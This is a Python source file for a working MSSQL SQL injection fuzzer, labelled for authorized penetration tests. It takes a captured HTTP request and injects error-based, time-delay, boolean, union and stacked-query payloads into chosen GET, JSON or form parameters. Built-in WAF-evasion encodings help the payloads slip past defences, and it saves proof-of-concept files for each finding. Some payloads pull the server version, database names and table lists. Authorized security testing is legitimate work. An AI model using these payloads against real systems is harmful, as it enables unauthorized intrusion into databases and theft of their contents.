#!/usr/bin/env python3
"""
sqli.py  –  MSSQL SQL Injection Fuzzer for Authorized Pentests
===============================================================
Covers:
  • Error-based          (convert/cast errors leaking data)
  • Time-based blind     (WAITFOR DELAY with jitter detection)
  • Boolean-based blind  (response length / status oracle)
  • Stacked queries      (;SELECT …)
  • Union-based          (column count + type probe)
  • GET  params in URL   (?fromDate=x&team=4)
  • POST JSON body       ({"param":"x"})
  • POST form body       (param1=x&param2=y)
  • WAF bypass           (comment injection, encoding, case, whitespace)

Usage:
  python3 sqli.py -r req.txt -p param
  python3 sqli.py -r req.txt -p fromDate,toDate --proxy 127.0.0.1:8080
  python3 sqli.py -r req.txt -p param --technique TEB --delay 6
  python3 sqli.py -r req.txt -p id --waf-level 3 --threads 3
"""

import argparse
import copy
import itertools
import json
import os
import re
import sys
import time
import urllib.parse
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════
#  COLOURS
# ═══════════════════════════════════════════════
R   = "\033[91m"
G   = "\033[92m"
Y   = "\033[93m"
B   = "\033[94m"
M   = "\033[95m"
C   = "\033[96m"
W   = "\033[97m"
DIM = "\033[2m"
RST = "\033[0m"

BANNER = f"""{B}
  ____   ___  _     _       ____ __   __
 / ___| / _ \\| |   (_)     |  _ \\\\ \\ / /
 \\___ \\| | | | |   | |     | |_) |\\ V /
  ___) | |_| | |___| |     |  __/  | |
 |____/ \\__\\_\\_____|_|     |_|     |_|
{C}  MSSQL SQL Injection Fuzzer  |  GET · POST · JSON · FORM
{DIM}  WAF Bypass · Error · Time-Blind · Boolean · Union · Stacked
  Authorized Pentests Only{RST}
"""

# ═══════════════════════════════════════════════
#  MSSQL ERROR SIGNATURES
# ═══════════════════════════════════════════════
MSSQL_ERRORS = [
    # Driver / ORM level
    "microsoft ole db", "odbc sql server", "odbc microsoft access",
    "sqlserver jdbc", "com.microsoft.sqlserver",
    "system.data.sqlclient", "sqlexception",
    # MSSQL native messages
    "unclosed quotation mark",
    "incorrect syntax near",
    "invalid column name",
    "invalid object name",
    "conversion failed when converting",
    "arithmetic overflow error",
    "divide by zero",
    "string or binary data would be truncated",
    "procedure or function",
    "subquery returned more than 1 value",
    "cannot insert duplicate key",
    "syntax error",
    "sql server",
    # Go MSSQL drivers
    "github.com/denisenkom",
    "go-mssqldb",
    "mssql:",
    "denisenkom",
    # Generic DB leaks
    "database error",
    "db error",
    "query error",
    "stack trace",
    # Istio/proxy DB leaks (sometimes pass through)
    "upstream connect error",
]

# ═══════════════════════════════════════════════
#  WAF BYPASS BUILDING BLOCKS
# ═══════════════════════════════════════════════

# Comment styles for MSSQL
COMMENTS = ["--", "-- -", "--+", "/**/", "/*!*/", "%00", "#"]

# Whitespace alternatives
SPACES = [" ", "/**/", "%09", "%0a", "%0d", "%0b", "%0c", "+", "%20"]

def waf_space(level: int) -> str:
    """Return a space alternative based on waf bypass level."""
    if level == 0: return " "
    if level == 1: return "/**/"
    if level == 2: return "%0a"
    return "%09"

def waf_comment(level: int) -> str:
    if level == 0: return "--"
    if level == 1: return "-- -"
    if level == 2: return "/*comment*/"
    return "%00"

def case_mix(s: str) -> str:
    """Alternate case: SELECT → SeLeCt"""
    return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))

def encode_payload(p: str, level: int) -> str:
    """Apply encoding based on waf level."""
    if level == 0: return p
    if level == 1: return p.replace(" ", "/**/")
    if level == 2: return urllib.parse.quote(p, safe="=&?/")
    if level == 3: return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")
    return p

# ═══════════════════════════════════════════════
#  PAYLOAD LIBRARY  — MSSQL SPECIFIC
# ═══════════════════════════════════════════════

def build_payloads(waf: int, delay: int) -> dict:
    """Build all payload sets with the given WAF level and delay."""
    sp  = waf_space(waf)
    cm  = waf_comment(waf)

    # ── Error-based ──────────────────────────────
    error_payloads = [
        # Quote / syntax probes
        "'",
        "''",
        '"',
        "`",
        "\\",
        # Classic error triggers
        f"'{sp}AND{sp}1=CONVERT(int,@@version){cm}",
        f"'{sp}AND{sp}1=CONVERT(int,db_name()){cm}",
        f"'{sp}AND{sp}1=CONVERT(int,user_name()){cm}",
        f"'{sp}AND{sp}1=CONVERT(int,@@servername){cm}",
        # CAST error extraction
        f"'+CAST(@@version{sp}AS{sp}int)+'{cm}",
        f"'+CAST(db_name(){sp}AS{sp}int)+'{cm}",
        f"'+CAST(user_name(){sp}AS{sp}int)+'{cm}",
        # MSSQL-specific fn abuse
        f"'{sp}AND{sp}1=1{sp}UNION{sp}SELECT{sp}NULL{cm}",
        f"'{sp}OR{sp}1=1{cm}",
        f"'{sp}OR{sp}1=2{cm}",
        f"'{sp}AND{sp}1=1{cm}",
        f"'{sp}AND{sp}1=2{cm}",
        # Double quote variant
        f"\"{sp}AND{sp}1=CONVERT(int,@@version){cm}",
        # Parenthesis close attempts
        f"'){sp}AND{sp}('1'='1",
        f"'));--",
        f"'));{sp}--",
        # Numeric (no quote needed)
        f"1{sp}AND{sp}1=CONVERT(int,@@version){cm}",
        f"1;SELECT{sp}@@version{cm}",
        f"0{sp}OR{sp}1=1{cm}",
        # Case mixed (WAF evasion)
        f"'{sp}{case_mix('AND')}{sp}1={case_mix('CONVERT')}(int,@@version){cm}",
        f"'{sp}{case_mix('OR')}{sp}1=1{cm}",
        # Stacked probe
        f"';{sp}SELECT{sp}1{cm}",
        f"1;{sp}SELECT{sp}@@version{cm}",
        # XML / FOR XML trick for data extraction
        f"'{sp}AND{sp}1=({case_mix('SELECT')}{sp}TOP{sp}1{sp}"
        f"CAST(name{sp}AS{sp}varchar(max)){sp}FROM{sp}sysobjects{sp}"
        f"WHERE{sp}xtype='U'){cm}",
    ]

    # ── Time-based blind ─────────────────────────
    time_payloads = [
        # Standard WAITFOR
        f"';{sp}WAITFOR{sp}DELAY{sp}'0:0:{delay}'{cm}",
        f"1;{sp}WAITFOR{sp}DELAY{sp}'0:0:{delay}'{cm}",
        f"'{sp}AND{sp}1=1;WAITFOR{sp}DELAY{sp}'0:0:{delay}'{cm}",
        f"'{sp}OR{sp}1=1;WAITFOR{sp}DELAY{sp}'0:0:{delay}'{cm}",
        # Conditional WAITFOR (blind)
        f"'{sp}IF(1=1){sp}WAITFOR{sp}DELAY{sp}'0:0:{delay}'{cm}",
        f"'{sp}IF(1=2){sp}WAITFOR{sp}DELAY{sp}'0:0:0'{cm}",
        # Numeric no-quote variant
        f"1;WAITFOR{sp}DELAY{sp}'0:0:{delay}'{cm}",
        f"0;WAITFOR{sp}DELAY{sp}'0:0:{delay}'{cm}",
        # Subquery conditional
        f"'{sp}AND{sp}1=(SELECT{sp}1{sp}WHERE{sp}1=1{sp}WAITFOR{sp}DELAY{sp}'0:0:{delay}'){cm}",
        # URL-encoded variants
        f"'%3BWAITFOR%20DELAY%20'0%3A0%3A{delay}'--%20",
        # Stacked with cast to avoid errors
        f"';{sp}SELECT{sp}CASE{sp}WHEN{sp}(1=1){sp}THEN{sp}"
        f"WAITFOR{sp}DELAY{sp}'0:0:{delay}'{sp}ELSE{sp}NULL{sp}END{cm}",
        # Without leading quote (numeric fields)
        f"1{sp}WAITFOR{sp}DELAY{sp}'0:0:{delay}'{cm}",
    ]

    # ── Boolean-based ────────────────────────────
    # (true/false pairs — compare response lengths)
    boolean_pairs = [
        # String fields
        (f"'{sp}AND{sp}'1'='1", f"'{sp}AND{sp}'1'='2"),
        (f"'{sp}OR{sp}'1'='1'--", f"'{sp}OR{sp}'1'='2'--"),
        (f"'{sp}AND{sp}1=1{cm}", f"'{sp}AND{sp}1=2{cm}"),
        # Numeric fields
        (f"1{sp}AND{sp}1=1{cm}", f"1{sp}AND{sp}1=2{cm}"),
        (f"1{sp}OR{sp}1=1{cm}", f"1{sp}OR{sp}1=2{cm}"),
        # Substring blind (example: first char of db_name)
        (f"'{sp}AND{sp}SUBSTRING(db_name(),1,1)='a'{cm}",
         f"'{sp}AND{sp}SUBSTRING(db_name(),1,1)='z'{cm}"),
        # LEN-based
        (f"'{sp}AND{sp}LEN(db_name())>0{cm}",
         f"'{sp}AND{sp}LEN(db_name())>999{cm}"),
    ]

    # ── Union-based column probes ─────────────────
    union_payloads = []
    for n in range(1, 11):
        nulls = ",".join(["NULL"] * n)
        union_payloads.append(f"'{sp}UNION{sp}SELECT{sp}{nulls}{cm}")
        # With ORDER BY to confirm col count
        union_payloads.append(f"'{sp}ORDER{sp}BY{sp}{n}{cm}")

    # ── Stacked queries ──────────────────────────
    stacked_payloads = [
        f"';{sp}SELECT{sp}@@version{cm}",
        f"';{sp}SELECT{sp}db_name(){cm}",
        f"';{sp}SELECT{sp}user_name(){cm}",
        f"';{sp}SELECT{sp}@@servername{cm}",
        f"';{sp}SELECT{sp}name{sp}FROM{sp}sys.databases{cm}",
        f"';{sp}SELECT{sp}name{sp}FROM{sp}sysobjects{sp}WHERE{sp}xtype='U'{cm}",
        f"';{sp}SELECT{sp}TOP{sp}1{sp}name{sp}FROM{sp}sys.tables{cm}",
        f"1;{sp}SELECT{sp}@@version{cm}",
        f"1;{sp}SELECT{sp}name{sp}FROM{sp}sys.databases{cm}",
    ]

    return {
        "error":   error_payloads,
        "time":    time_payloads,
        "boolean": boolean_pairs,
        "union":   union_payloads,
        "stacked": stacked_payloads,
    }


# ═══════════════════════════════════════════════
#  REQUEST PARSER  (same interface as nosql.py)
# ═══════════════════════════════════════════════

def parse_raw_request(path: str) -> dict:
    with open(path, "r", errors="replace") as fh:
        raw = fh.read()
    raw   = raw.replace("\r\n", "\n").replace("\r", "\n")
    lines = raw.split("\n")

    req_line = lines[0].strip()
    parts    = req_line.split(" ")
    if len(parts) < 2:
        raise ValueError(f"Bad request line: {req_line}")
    method  = parts[0].upper()
    path_qs = parts[1]

    headers: Dict[str, str] = {}
    i = 1
    while i < len(lines) and lines[i].strip():
        if ":" in lines[i]:
            k, v = lines[i].split(":", 1)
            headers[k.strip()] = v.strip()
        i += 1
    body = "\n".join(lines[i+1:]).strip()

    host   = headers.get("Host", "localhost")
    url    = f"https://{host}{path_qs}"

    parsed_url   = urllib.parse.urlparse(url)
    query_params = dict(urllib.parse.parse_qsl(parsed_url.query, keep_blank_values=True))
    base_url     = urllib.parse.urlunparse(parsed_url._replace(query=""))

    ct = headers.get("Content-Type", "")
    if "json" in ct:
        body_type = "json"
    elif "form" in ct or "urlencoded" in ct:
        body_type = "form"
    elif body and body.strip().startswith("{"):
        body_type = "json"
    elif body and "=" in body and not body.strip().startswith("{"):
        body_type = "form"
    else:
        body_type = "none"

    return {
        "method":       method,
        "url":          url,
        "base_url":     base_url,
        "headers":      headers,
        "body":         body,
        "body_type":    body_type,
        "query_params": query_params,
    }


def parse_body(raw: str, body_type: str) -> Tuple[Any, str]:
    if not raw:
        return {}, body_type
    if body_type == "json":
        try: return json.loads(raw), "json"
        except: pass
    if body_type == "form":
        p = urllib.parse.parse_qs(raw, keep_blank_values=True)
        return {k: v[0] for k, v in p.items()}, "form"
    try: return json.loads(raw), "json"
    except: pass
    if "=" in raw:
        p = urllib.parse.parse_qs(raw, keep_blank_values=True)
        return {k: v[0] for k, v in p.items()}, "form"
    return raw, "raw"


def detect_location(param: str, qp: dict, body: Any) -> str:
    in_get  = param in qp
    in_post = isinstance(body, dict) and param in body
    if in_get and in_post: return "both"
    if in_get:  return "get"
    if in_post: return "post"
    return "both"


# ═══════════════════════════════════════════════
#  INJECTION HELPERS
# ═══════════════════════════════════════════════

def inject_body(data: Any, param: str, payload: str) -> Any:
    mutated = copy.deepcopy(data) if data else {}
    if not isinstance(mutated, dict):
        return mutated
    keys = param.split(".")
    ref  = mutated
    for k in keys[:-1]:
        ref = ref.setdefault(k, {})
    ref[keys[-1]] = payload
    return mutated


def body_to_str(data: Any, btype: str) -> str:
    if btype == "json":
        return json.dumps(data)
    if btype == "form":
        return urllib.parse.urlencode(
            {k: (json.dumps(v) if isinstance(v, (dict, list)) else str(v) if v is not None else "")
             for k, v in data.items()})
    return str(data)


def inject_url(base: str, qp: dict, param: str, payload: str) -> str:
    m = copy.deepcopy(qp)
    m[param] = payload
    qs = urllib.parse.urlencode(m, doseq=True)
    return f"{base}?{qs}"


# ═══════════════════════════════════════════════
#  HTTP ENGINE
# ═══════════════════════════════════════════════

def send(req_t: dict, url: str, body_str: str,
         proxy: Optional[str], timeout: int) -> dict:
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
    hdrs    = dict(req_t["headers"])
    bt      = req_t.get("body_type", "none")
    if body_str and bt != "none":
        hdrs["Content-Type"] = {
            "json": "application/json",
            "form": "application/x-www-form-urlencoded"
        }.get(bt, "application/json")
    for h in ["Content-Length", "Transfer-Encoding", "Connection"]:
        hdrs.pop(h, None)

    t0 = time.time()
    try:
        r = requests.request(
            method=req_t["method"], url=url, headers=hdrs,
            data=body_str or None, proxies=proxies,
            verify=False, timeout=timeout, allow_redirects=False)
        return {
            "status": r.status_code, "length": len(r.content),
            "time":   round(time.time() - t0, 3),
            "body":   r.text[:4000], "error": None,
        }
    except requests.exceptions.Timeout:
        return {"status": 0, "length": 0,
                "time": round(time.time()-t0, 3),
                "body": "", "error": "TIMEOUT"}
    except Exception as e:
        return {"status": 0, "length": 0,
                "time": round(time.time()-t0, 3),
                "body": "", "error": str(e)[:150]}


# ═══════════════════════════════════════════════
#  DETECTION
# ═══════════════════════════════════════════════

def find_errors(body: str) -> List[str]:
    return [sig for sig in MSSQL_ERRORS if sig.lower() in body.lower()]


def make_verdict(result: dict, baseline: dict,
                 delay: int, is_time_payload: bool) -> dict:
    len_delta  = abs(result["length"] - baseline["length"])
    time_delta = result["time"] - baseline["time"]
    stat_diff  = result["status"] != baseline["status"]
    errors     = find_errors(result["body"])
    timed_out  = result["error"] == "TIMEOUT"
    req_err    = result["error"] and not timed_out

    if req_err:
        return {"level": "ERROR", "reasons": [f"Request error: {result['error']}"],
                "time_delta": round(time_delta,3), "len_delta": len_delta, "errors": []}

    level, reasons = "CLEAN", []

    # 1. Time-based
    if is_time_payload:
        expected = delay * 0.75   # allow 25% margin
        if timed_out or time_delta >= expected:
            level = "CONFIRMED"
            reasons.append(
                f"Time-based: Δt={time_delta:.2f}s ≥ expected {expected:.1f}s"
                if not timed_out else "TIMEOUT on timing payload")

    # 2. Error-based
    if errors:
        level = "CONFIRMED"
        reasons.append(f"MSSQL error strings: {errors}")

    # 3. Status / length anomaly
    if not reasons:
        if stat_diff and result["status"] in (200, 201, 302):
            level = "CONFIRMED"
            reasons.append(f"Status {baseline['status']}→{result['status']}")
        elif stat_diff and len_delta > 50:
            level = "POTENTIAL"
            reasons.append(f"Status change + Δlen={len_delta}")
        elif stat_diff:
            level = "POTENTIAL"
            reasons.append(f"Status change: {baseline['status']}→{result['status']}")
        elif len_delta > 500:
            level = "POTENTIAL"
            reasons.append(f"Large Δlen={len_delta}")
        elif len_delta > 100:
            level = "POTENTIAL"
            reasons.append(f"Moderate Δlen={len_delta}")

    return {"level": level, "reasons": reasons,
            "time_delta": round(time_delta,3),
            "len_delta": len_delta, "errors": errors}


# ═══════════════════════════════════════════════
#  POC GENERATOR
# ═══════════════════════════════════════════════

def save_poc(req_t: dict, fuzz_url: str, body_str: str,
             param: str, payload: str, technique: str,
             result: dict, vdict: dict, ts: str) -> str:
    fname = f"sqli_poc_{param}_{technique}_{ts}.txt"
    with open(fname, "w") as fh:
        fh.write("=" * 65 + "\n")
        fh.write("  MSSQL SQL INJECTION – PROOF OF CONCEPT\n")
        fh.write(f"  Generated : {datetime.now().isoformat()}\n")
        fh.write("=" * 65 + "\n\n")
        fh.write(f"Verdict    : {vdict['level']}\n")
        fh.write(f"Technique  : {technique}\n")
        fh.write(f"Parameter  : {param}\n")
        fh.write(f"Reasons    : {'; '.join(vdict['reasons'])}\n\n")
        fh.write("--- REQUEST ---\n")
        fh.write(f"{req_t['method']} {fuzz_url}\n")
        for k, v in req_t["headers"].items():
            fh.write(f"{k}: {v}\n")
        if body_str:
            fh.write(f"\n{body_str}\n")
        fh.write("\n--- PAYLOAD ---\n")
        fh.write(repr(payload) + "\n")
        fh.write("\n--- RESPONSE ---\n")
        fh.write(f"Status    : {result['status']}\n")
        fh.write(f"Length    : {result['length']}\n")
        fh.write(f"Time      : {result['time']}s\n")
        fh.write(f"Δtime     : {vdict['time_delta']}s\n")
        fh.write(f"Δlength   : {vdict['len_delta']}\n\n")
        fh.write("--- BODY EXCERPT ---\n")
        fh.write(result["body"][:2000] + "\n")
    return fname


# ═══════════════════════════════════════════════
#  FUZZER
# ═══════════════════════════════════════════════

class SQLiFuzzer:

    def __init__(self, req_t, pbody, btype, baseline,
                 proxy, delay, timeout, waf, techniques,
                 logger, ts):
        self.req      = req_t
        self.pbody    = pbody
        self.btype    = btype
        self.baseline = baseline
        self.proxy    = proxy
        self.delay    = delay
        self.timeout  = timeout
        self.waf      = waf
        self.techs    = techniques
        self.log      = logger
        self.ts       = ts
        self.findings = []
        self.payloads = build_payloads(waf, delay)

    # ── fire one request ───────────────────────
    def _fire(self, url: str, body_str: str, param: str,
              payload: str, technique: str,
              is_time: bool = False, label: str = "") -> str:
        result = send(self.req, url, body_str, self.proxy, self.timeout)
        vdict  = make_verdict(result, self.baseline, self.delay, is_time)

        col = {"CONFIRMED": R, "POTENTIAL": Y,
               "CLEAN": DIM, "ERROR": M}.get(vdict["level"], W)
        pl_s = repr(payload)[:60]
        line = (f"  [{vdict['level']:12s}] {technique:8s} | {label:5s} | "
                f"param={param:20s} | payload={pl_s:60s} | "
                f"s={result['status']} len={result['length']:6d} "
                f"t={result['time']:.2f}s Δt={vdict['time_delta']:+.2f}s "
                f"Δlen={vdict['len_delta']}")
        if vdict["reasons"]:
            line += f"\n         ↳ {'; '.join(vdict['reasons'])}"
        print(f"{col}{line}{RST}")
        self.log(line.replace("\n", " | "))

        if vdict["level"] in ("CONFIRMED", "POTENTIAL"):
            poc = save_poc(self.req, url, body_str, param,
                           payload, technique, result, vdict, self.ts)
            msg = f"         ↳ {R}PoC → {poc}{RST}"
            print(msg); self.log(f"POC: {poc}")
            self.findings.append({
                "param": param, "payload": payload, "technique": technique,
                "result": result, "verdict": vdict, "poc": poc, "label": label
            })
        time.sleep(0.1)
        return vdict["level"]

    # ── build url/body for a given location ───
    def _make_req(self, param: str, payload: str,
                  location: str, encoded: str = None):
        pl = encoded or payload
        if location == "get":
            url  = inject_url(self.req["base_url"],
                               self.req["query_params"], param, pl)
            body = self.req["body"]
        else:
            url     = self.req["url"]
            mutated = inject_body(self.pbody, param, pl)
            body    = body_to_str(mutated, self.btype)
        return url, body

    # ── encode variants for WAF bypass ────────
    def _variants(self, payload: str) -> List[Tuple[str, str]]:
        """Return list of (label, encoded_payload) for WAF levels."""
        out = [("RAW", payload)]
        if self.waf >= 1:
            out.append(("CMNT", payload.replace(" ", "/**/")))
        if self.waf >= 2:
            out.append(("URLENC", urllib.parse.quote(payload, safe="")))
        if self.waf >= 3:
            out.append(("DBLENC", urllib.parse.quote(
                urllib.parse.quote(payload, safe=""), safe="")))
            out.append(("CASE", case_mix(payload)))
        return out

    # ── ERROR-BASED ────────────────────────────
    def run_error(self, param: str, location: str):
        print(f"\n{C}  [ERROR-BASED] param={param} loc={location}{RST}")
        self.log(f"[ERROR] param={param} loc={location}")
        for raw_pl in self.payloads["error"]:
            for lbl, pl in self._variants(raw_pl):
                url, body = self._make_req(param, pl, location)
                self._fire(url, body, param, pl, "ERROR", label=lbl)

    # ── TIME-BASED ─────────────────────────────
    def run_time(self, param: str, location: str):
        print(f"\n{C}  [TIME-BASED] param={param} loc={location} delay={self.delay}s{RST}")
        self.log(f"[TIME] param={param} loc={location} delay={self.delay}s")
        for raw_pl in self.payloads["time"]:
            for lbl, pl in self._variants(raw_pl):
                url, body = self._make_req(param, pl, location)
                self._fire(url, body, param, pl, "TIME",
                           is_time=True, label=lbl)

    # ── BOOLEAN-BASED ──────────────────────────
    def run_boolean(self, param: str, location: str):
        print(f"\n{C}  [BOOLEAN] param={param} loc={location}{RST}")
        self.log(f"[BOOL] param={param} loc={location}")

        true_lens, false_lens = [], []
        for (true_pl, false_pl) in self.payloads["boolean"]:
            for lbl, tpl in self._variants(true_pl):
                url, body = self._make_req(param, tpl, location)
                r = send(self.req, url, body, self.proxy, self.timeout)
                true_lens.append(r["length"])
                time.sleep(0.08)
            for lbl, fpl in self._variants(false_pl):
                url, body = self._make_req(param, fpl, location)
                r = send(self.req, url, body, self.proxy, self.timeout)
                false_lens.append(r["length"])
                time.sleep(0.08)

        if not true_lens or not false_lens:
            return
        avg_t = sum(true_lens)  / len(true_lens)
        avg_f = sum(false_lens) / len(false_lens)
        delta = abs(avg_t - avg_f)
        col   = R if delta > 200 else (Y if delta > 50 else DIM)
        flag  = "*** BOOLEAN SQLI LIKELY ***" if delta > 50 else "no significant delta"
        msg   = (f"  [BOOL_RESULT] param={param} | "
                 f"avg_TRUE={avg_t:.0f} avg_FALSE={avg_f:.0f} Δ={delta:.0f}  {flag}")
        print(f"{col}{msg}{RST}")
        self.log(msg)
        if delta > 50:
            self.findings.append({
                "param": param, "payload": "boolean-correlation",
                "technique": "BOOLEAN",
                "result": {"status": "N/A", "length": avg_t, "time": 0, "body": ""},
                "verdict": {"level": "POTENTIAL" if delta < 200 else "CONFIRMED",
                            "reasons": [f"Boolean Δlen={delta:.0f}"],
                            "time_delta": 0, "len_delta": int(delta), "errors": []},
                "poc": None, "label": "BOOL"
            })

    # ── UNION-BASED ────────────────────────────
    def run_union(self, param: str, location: str):
        print(f"\n{C}  [UNION] column-count probe param={param}{RST}")
        self.log(f"[UNION] param={param}")
        for raw_pl in self.payloads["union"]:
            for lbl, pl in self._variants(raw_pl):
                url, body = self._make_req(param, pl, location)
                self._fire(url, body, param, pl, "UNION", label=lbl)

    # ── STACKED ────────────────────────────────
    def run_stacked(self, param: str, location: str):
        print(f"\n{C}  [STACKED] param={param}{RST}")
        self.log(f"[STACKED] param={param}")
        for raw_pl in self.payloads["stacked"]:
            for lbl, pl in self._variants(raw_pl):
                url, body = self._make_req(param, pl, location)
                self._fire(url, body, param, pl, "STACKED", label=lbl)

    # ── MAIN RUN ───────────────────────────────
    def run(self, params: List[str]):
        technique_map = {
            "E": self.run_error,
            "T": self.run_time,
            "B": self.run_boolean,
            "U": self.run_union,
            "S": self.run_stacked,
        }
        for param in params:
            location = detect_location(param, self.req["query_params"], self.pbody)
            # If not found anywhere, try both
            locations = ["get", "post"] if location == "both" else [location]

            print(f"\n{W}{'═'*75}{RST}")
            print(f"{W}  PARAMETER: {param}   LOCATION: {location.upper()}{RST}")
            print(f"{W}{'═'*75}{RST}")
            self.log(f"\n{'='*75}")
            self.log(f"PARAMETER: {param}  LOCATION: {location}")

            for loc in locations:
                for tech in self.techs:
                    fn = technique_map.get(tech)
                    if fn:
                        fn(param, loc)


# ═══════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════

def main():
    print(BANNER)
    ap = argparse.ArgumentParser(description="MSSQL SQLi Fuzzer for Authorized Pentests")
    ap.add_argument("-r",  "--request",   required=True,
                    help="Burp raw request file")
    ap.add_argument("-p",  "--params",    required=True,
                    help="Comma-separated params to fuzz (e.g. id,fromDate,ruleDriver)")
    ap.add_argument("--proxy",            default=None,
                    help="Proxy host:port (e.g. 127.0.0.1:8080)")
    ap.add_argument("--delay",            default=5, type=int,
                    help="Seconds for WAITFOR DELAY payloads (default: 5)")
    ap.add_argument("--timeout",          default=20, type=int,
                    help="HTTP request timeout in seconds (default: 20)")
    ap.add_argument("--technique",        default="EBTUS",
                    help="Techniques to run: E=error T=time B=boolean U=union S=stacked "
                         "(default: EBTUS = all)")
    ap.add_argument("--waf-level",        default=1, type=int, choices=[0,1,2,3],
                    help="WAF bypass intensity: 0=none 1=comments 2=url-encode 3=double-encode+case "
                         "(default: 1)")
    ap.add_argument("--scheme",           default="https", choices=["http","https"])
    ap.add_argument("-o", "--output",     default=None,
                    help="Log file name (default: sqli_output-<timestamp>.log)")
    args = ap.parse_args()

    ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = args.output or f"sqli_output-{ts}.log"
    params   = [p.strip() for p in args.params.split(",") if p.strip()]
    techs    = list(args.technique.upper())

    log_fh = open(log_file, "w")
    def logger(msg: str):
        log_fh.write(msg + "\n")
        log_fh.flush()

    logger(f"sqli.py started={datetime.now().isoformat()}")
    logger(f"request={args.request} params={params} proxy={args.proxy}")
    logger(f"delay={args.delay}s timeout={args.timeout}s waf={args.waf_level}")
    logger(f"techniques={techs}")
    logger("="*75)

    # Parse
    try:
        req_t = parse_raw_request(args.request)
    except FileNotFoundError:
        print(f"{R}[!] File not found: {args.request}{RST}"); sys.exit(1)
    except Exception as e:
        print(f"{R}[!] Parse error: {e}{RST}"); sys.exit(1)

    if args.scheme == "http":
        req_t["url"]      = req_t["url"].replace("https://","http://",1)
        req_t["base_url"] = req_t["base_url"].replace("https://","http://",1)

    pbody, btype = parse_body(req_t["body"], req_t["body_type"])
    req_t["body_type"] = btype

    print(f"{B}[*] Target     : {req_t['url']}{RST}")
    print(f"{B}[*] Method     : {req_t['method']}{RST}")
    print(f"{B}[*] Body type  : {btype}{RST}")
    print(f"{B}[*] GET params : {list(req_t['query_params'].keys())}{RST}")
    if isinstance(pbody, dict):
        print(f"{B}[*] POST params: {list(pbody.keys())}{RST}")
    print(f"{B}[*] Fuzzing    : {params}{RST}")
    print(f"{B}[*] Techniques : {techs} (E=error T=time B=bool U=union S=stacked){RST}")
    print(f"{B}[*] WAF level  : {args.waf_level}{RST}")
    print(f"{B}[*] Delay      : {args.delay}s  Timeout: {args.timeout}s{RST}")
    print(f"{B}[*] Proxy      : {args.proxy or 'none'}{RST}")
    print(f"{B}[*] Log        : {log_file}{RST}\n")

    # Baseline
    print(f"{G}[*] Sending baseline...{RST}")
    baseline = send(req_t, req_t["url"], req_t["body"], args.proxy, args.timeout)
    if baseline["error"]:
        print(f"{Y}[!] Baseline error: {baseline['error']} — results may be unreliable{RST}")
    else:
        print(f"{G}[+] Baseline: status={baseline['status']} "
              f"len={baseline['length']} time={baseline['time']}s{RST}\n")
    logger(f"[BASELINE] status={baseline['status']} "
           f"len={baseline['length']} time={baseline['time']}s")

    # Fuzz
    fuzzer = SQLiFuzzer(
        req_t, pbody, btype, baseline,
        args.proxy, args.delay, args.timeout,
        args.waf_level, techs, logger, ts
    )
    fuzzer.run(params)

    # Summary
    findings  = fuzzer.findings
    confirmed = [f for f in findings if f["verdict"]["level"] == "CONFIRMED"]
    potential = [f for f in findings if f["verdict"]["level"] == "POTENTIAL"]

    print(f"\n{W}{'═'*75}{RST}")
    print(f"{W}  FINAL SUMMARY{RST}")
    print(f"{W}{'═'*75}{RST}")
    logger("\n" + "="*75 + "\nFINAL SUMMARY\n" + "="*75)

    if not findings:
        print(f"{G}  [+] No anomalies detected.{RST}")
        logger("[RESULT] No anomalies.")
    else:
        print(f"{R}  CONFIRMED : {len(confirmed)}{RST}")
        print(f"{Y}  POTENTIAL : {len(potential)}{RST}\n")
        for f in confirmed + potential:
            pl   = repr(f['payload'])[:60]
            line = (f"  [{f['verdict']['level']:9s}] [{f['technique']:8s}] "
                    f"param={f['param']} | payload={pl}\n"
                    f"               reasons={'; '.join(f['verdict']['reasons'])}")
            if f.get("poc"):
                line += f"\n               poc={f['poc']}"
            print(f"{R if f['verdict']['level']=='CONFIRMED' else Y}{line}{RST}")
            logger(line.replace("\n"," | "))

    print(f"\n{B}[*] Log saved to: {log_file}{RST}")
    log_fh.close()


if __name__ == "__main__":
    main()
